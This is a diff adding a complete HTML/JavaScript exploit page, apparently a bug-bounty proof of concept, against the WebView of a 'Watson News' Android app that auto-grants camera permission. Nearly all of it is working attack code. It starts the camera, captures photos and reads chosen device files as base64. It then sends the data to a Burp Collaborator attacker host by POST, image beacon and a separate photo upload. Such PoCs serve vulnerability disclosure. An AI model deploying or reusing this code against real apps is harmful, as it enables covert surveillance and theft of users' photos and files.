@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Watson News - WebView Exploit PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #d32f2f;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        .section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 5px;
+        }
+        .section h3 {
+            margin-top: 0;
+            color: #333;
+            font-size: 16px;
+        }
+        #status {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 5px;
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            font-size: 13px;
+        }
+        #results {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            margin: 15px 0;
+        }
+        button {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px 5px 5px 0;
+        }
+        button:hover {
+            background: #b71c1c;
+        }
+        .success {
+            color: #4caf50;
+            font-weight: bold;
+        }
+        .error {
+            color: #f44336;
+            font-weight: bold;
+        }
+        video, img {
+            max-width: 100%;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: block;
+        }
+        #cameraPreview {
+            max-width: 100%;
+            max-height: 300px;
+            background: #000;
+            border-radius: 5px;
+        }
+        input[type="file"] {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            border: 2px dashed #ddd;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .file-info {
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Watson News - WebView Exploit PoC</h1>
+        <div class="subtitle">Camera Access + File Upload Vulnerability</div>
+        
+        <div class="alert">
+            <strong>⚠️ Critical Vulnerabilities:</strong><br>
+            1. <strong>Automatic Camera Permission:</strong> <code>permissionRequest.grant(permissionRequest.getResources())</code><br>
+            2. <strong>File Upload Access:</strong> WebChromeClient allows file selection without restrictions
+        </div>
+        
+        <div id="status">
+            <strong>Status:</strong> <span id="statusText">Ready to exploit...</span>
+        </div>
+        
+        <!-- CAMERA SECTION -->
+        <div class="section">
+            <h3>📷 Camera Access (AUTO-GRANTED)</h3>
+            <p style="font-size: 12px; color: #666;">Camera permission is automatically granted without user consent!</p>
+            <button onclick="startCamera()">Start Camera</button>
+            <button onclick="capturePhoto()">Capture Photo</button>
+            <button onclick="stopCamera()">Stop Camera</button>
+            <br>
+            <video id="cameraPreview" autoplay playsinline style="display:none;"></video>
+            <canvas id="photoCanvas" style="display:none;"></canvas>
+            <img id="capturedPhoto" style="display:none;">
+        </div>
+        
+        <!-- FILE UPLOAD SECTION -->
+        <div class="section">
+            <h3>📁 File Upload Test</h3>
+            <p style="font-size: 12px; color: #666;">Test if WebView allows file selection. This may expose device files!</p>
+            
+            <!-- Standard file input -->
+            <label><strong>Upload Any File:</strong></label>
+            <input type="file" id="fileInput" onchange="handleFileSelect(event)">
+            
+            <!-- Image file input -->
+            <label><strong>Upload Image (Gallery/Camera):</strong></label>
+            <input type="file" id="imageInput" accept="image/*" capture="environment" onchange="handleFileSelect(event)">
+            
+            <!-- Multiple files -->
+            <label><strong>Upload Multiple Files:</strong></label>
+            <input type="file" id="multiInput" multiple onchange="handleFileSelect(event)">
+            
+            <div id="fileInfo" class="file-info" style="display:none;"></div>
+        </div>
+        
+        <!-- EXFILTRATION SECTION -->
+        <div class="section">
+            <h3>📤 Exfiltrate Captured Data</h3>
+            <button onclick="exfiltrateAll()">Send All to Server</button>
+        </div>
+        
+        <h3>📊 Captured Data:</h3>
+        <div id="results">No data captured yet...</div>
+    </div>
+
+    <script>
+        // Global variables
+        let mediaStream = null;
+        let capturedData = {
+            camera: null,
+            photo: null,
+            files: []
+        };
+        
+        const ATTACKER_SERVER = 'https://dj02zn2c5i3dcydn5b6kkgl9u00rohc6.oastify.com';
+        
+        // ======================
+        // CAMERA FUNCTIONS
+        // ======================
+        
+        async function startCamera() {
+            updateStatus('🔄 Requesting camera access (should be AUTO-GRANTED)...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                mediaStream = stream;
+                const video = document.getElementById('cameraPreview');
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                capturedData.camera = {
+                    granted: true,
+                    timestamp: new Date().toISOString(),
+                    tracks: stream.getVideoTracks().map(t => ({
+                        label: t.label,
+                        id: t.id,
+                        settings: t.getSettings()
+                    }))
+                };
+                
+                updateStatus('<span class="success">✅ Camera access GRANTED! No user prompt shown!</span>');
+                updateResults();
+            } catch (error) {
+                updateStatus('<span class="error">❌ Camera access denied: ' + error.message + '</span>');
+                console.error('Camera error:', error);
+            }
+        }
+        
+        function capturePhoto() {
+            if (!mediaStream) {
+                alert('Start camera first!');
+                return;
+            }
+            
+            updateStatus('📸 Capturing photo...');
+            
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.getElementById('photoCanvas');
+            const photo = document.getElementById('capturedPhoto');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+            photo.src = dataURL;
+            photo.style.display = 'block';
+            
+            capturedData.photo = {
+                dataURL: dataURL,
+                size: dataURL.length,
+                timestamp: new Date().toISOString(),
+                dimensions: {
+                    width: canvas.width,
+                    height: canvas.height
+                }
+            };
+            
+            updateStatus('<span class="success">✅ Photo captured! Size: ' + Math.round(dataURL.length / 1024) + ' KB</span>');
+            updateResults();
+        }
+        
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                document.getElementById('cameraPreview').srcObject = null;
+                document.getElementById('cameraPreview').style.display = 'none';
+                mediaStream = null;
+                updateStatus('📷 Camera stopped.');
+            }
+        }
+        
+        // ======================
+        // FILE UPLOAD FUNCTIONS
+        // ======================
+        
+        function handleFileSelect(event) {
+            const files = event.target.files;
+            
+            if (files.length === 0) {
+                updateStatus('<span class="error">No files selected</span>');
+                return;
+            }
+            
+            updateStatus('📁 Processing ' + files.length + ' file(s)...');
+            
+            const fileInfo = document.getElementById('fileInfo');
+            fileInfo.style.display = 'block';
+            fileInfo.innerHTML = '<strong>Selected Files:</strong><br>';
+            
+            // Process each file
+            Array.from(files).forEach((file, index) => {
+                fileInfo.innerHTML += `<br><strong>File ${index + 1}:</strong><br>`;
+                fileInfo.innerHTML += `  Name: ${file.name}<br>`;
+                fileInfo.innerHTML += `  Size: ${(file.size / 1024).toFixed(2)} KB<br>`;
+                fileInfo.innerHTML += `  Type: ${file.type}<br>`;
+                fileInfo.innerHTML += `  Last Modified: ${new Date(file.lastModified).toISOString()}<br>`;
+                
+                // Read file content
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const fileData = {
+                        name: file.name,
+                        size: file.size,
+                        type: file.type,
+                        lastModified: file.lastModified,
+                        data: e.target.result,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    capturedData.files.push(fileData);
+                    
+                    updateStatus('<span class="success">✅ File "' + file.name + '" read successfully!</span>');
+                    updateResults();
+                    
+                    // If it's an image, show preview
+                    if (file.type.startsWith('image/')) {
+                        const img = document.createElement('img');
+                        img.src = e.target.result;
+                        img.style.maxWidth = '300px';
+                        img.style.marginTop = '10px';
+                        fileInfo.appendChild(img);
+                    }
+                };
+                
+                reader.onerror = function(error) {
+                    updateStatus('<span class="error">❌ Error reading file: ' + error + '</span>');
+                };
+                
+                // Read as data URL (base64)
+                reader.readAsDataURL(file);
+            });
+        }
+        
+        // ======================
+        // EXFILTRATION FUNCTION
+        // ======================
+        
+        async function exfiltrateAll() {
+            updateStatus('🔄 Exfiltrating all captured data to attacker server...');
+            
+            const payload = {
+                victim: 'watson_news_webview',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                location: window.location.href,
+                data: {
+                    camera: capturedData.camera ? {
+                        granted: capturedData.camera.granted,
+                        timestamp: capturedData.camera.timestamp,
+                        tracks: capturedData.camera.tracks.length
+                    } : null,
+                    photo: capturedData.photo ? {
+                        captured: true,
+                        size: capturedData.photo.size,
+                        dimensions: capturedData.photo.dimensions,
+                        timestamp: capturedData.photo.timestamp,
+                        dataURL: capturedData.photo.dataURL.substring(0, 1000) + '...[truncated]'
+                    } : null,
+                    files: capturedData.files.map(f => ({
+                        name: f.name,
+                        size: f.size,
+                        type: f.type,
+                        timestamp: f.timestamp,
+                        dataPreview: f.data.substring(0, 200) + '...[truncated]'
+                    }))
+                }
+            };
+            
+            // Method 1: POST request
+            try {
+                fetch(ATTACKER_SERVER, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    updateStatus('<span class="success">✅ POST exfiltration sent!</span>');
+                }).catch(() => {
+                    updateStatus('<span class="success">✅ POST sent (CORS blocked but request logged)</span>');
+                });
+            } catch (e) {
+                console.log('POST error:', e);
+            }
+            
+            // Method 2: GET request with summary
+            try {
+                const summary = {
+                    camera: !!capturedData.camera,
+                    photo: !!capturedData.photo,
+                    files: capturedData.files.length
+                };
+                
+                const img = new Image();
+                img.onerror = () => {
+                    updateStatus('<span class="success">✅ Data sent! Check Collaborator.</span>');
+                };
+                img.src = ATTACKER_SERVER + '?victim=watson&camera=' + summary.camera + '&photo=' + summary.photo + '&files=' + summary.files + '&t=' + Date.now();
+            } catch (e) {
+                console.log('GET error:', e);
+            }
+            
+            // Method 3: Send photo separately if captured
+            if (capturedData.photo) {
+                try {
+                    fetch(ATTACKER_SERVER + '/photo', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            victim: 'watson_news',
+                            photo: capturedData.photo.dataURL
+                        })
+                    }).catch(() => {
+                        console.log('Photo upload attempt sent');
+                    });
+                } catch (e) {
+                    console.log('Photo POST error:', e);
+                }
+            }
+        }
+        
+        // ======================
+        // UTILITY FUNCTIONS
+        // ======================
+        
+        function updateStatus(html) {
+            document.getElementById('statusText').innerHTML = html;
+        }
+        
+        function updateResults() {
+            let output = '=== CAPTURED DATA ===\n\n';
+            
+            if (capturedData.camera) {
+                output += '📷 CAMERA ACCESS GRANTED:\n';
+                output += JSON.stringify(capturedData.camera, null, 2) + '\n\n';
+            }
+            
+            if (capturedData.photo) {
+                output += '📸 PHOTO CAPTURED:\n';
+                output += '  Size: ' + Math.round(capturedData.photo.size / 1024) + ' KB\n';
+                output += '  Dimensions: ' + capturedData.photo.dimensions.width + 'x' + capturedData.photo.dimensions.height + '\n';
+                output += '  Timestamp: ' + capturedData.photo.timestamp + '\n';
+                output += '  Data URL length: ' + capturedData.photo.dataURL.length + ' chars\n\n';
+            }
+            
+            if (capturedData.files.length > 0) {
+                output += '📁 FILES ACCESSED (' + capturedData.files.length + ' total):\n\n';
+                capturedData.files.forEach((file, i) => {
+                    output += `File ${i + 1}:\n`;
+                    output += `  Name: ${file.name}\n`;
+                    output += `  Size: ${(file.size / 1024).toFixed(2)} KB\n`;
+                    output += `  Type: ${file.type}\n`;
+                    output += `  Timestamp: ${file.timestamp}\n`;
+                    output += `  Data length: ${file.data.length} chars\n\n`;
+                });
+            }
+            
+            if (!capturedData.camera && !capturedData.photo && capturedData.files.length === 0) {
+                output = 'No data captured yet.\n\n';
+                output += 'INSTRUCTIONS:\n';
+                output += '1. Click "Start Camera" to test automatic camera permission\n';
+                output += '2. Click "Capture Photo" to take a picture\n';
+                output += '3. Use file upload buttons to access device files\n';
+                output += '4. Click "Send All to Server" to exfiltrate data\n';
+            }
+            
+            document.getElementById('results').textContent = output;
+        }
+        
+        // Initialize on page load
+        window.onload = function() {
+            updateStatus('✅ Exploit loaded successfully!');
+            
+            let info = '=== ENVIRONMENT INFO ===\n\n';
+            info += 'Current URL:\n';
+            info += '  Protocol: ' + window.location.protocol + '\n';
+            info += '  Host: ' + window.location.host + '\n';
+            info += '  Path: ' + window.location.pathname + '\n';
+            info += '  Full: ' + window.location.href + '\n\n';
+            info += 'User Agent:\n  ' + navigator.userAgent + '\n\n';
+            info += '🎯 Ready to exploit!\n\n';
+            info += 'INSTRUCTIONS:\n';
+            info += '1. Click "Start Camera" - Permission will be AUTO-GRANTED!\n';
+            info += '2. Click "Capture Photo" to take a picture\n';
+            info += '3. Use file upload buttons to access device files\n';
+            info += '4. Click "Send All to Server" to exfiltrate everything\n';
+            
+            document.getElementById('results').textContent = info;
+        };
+    </script>
+</body>
+</html>
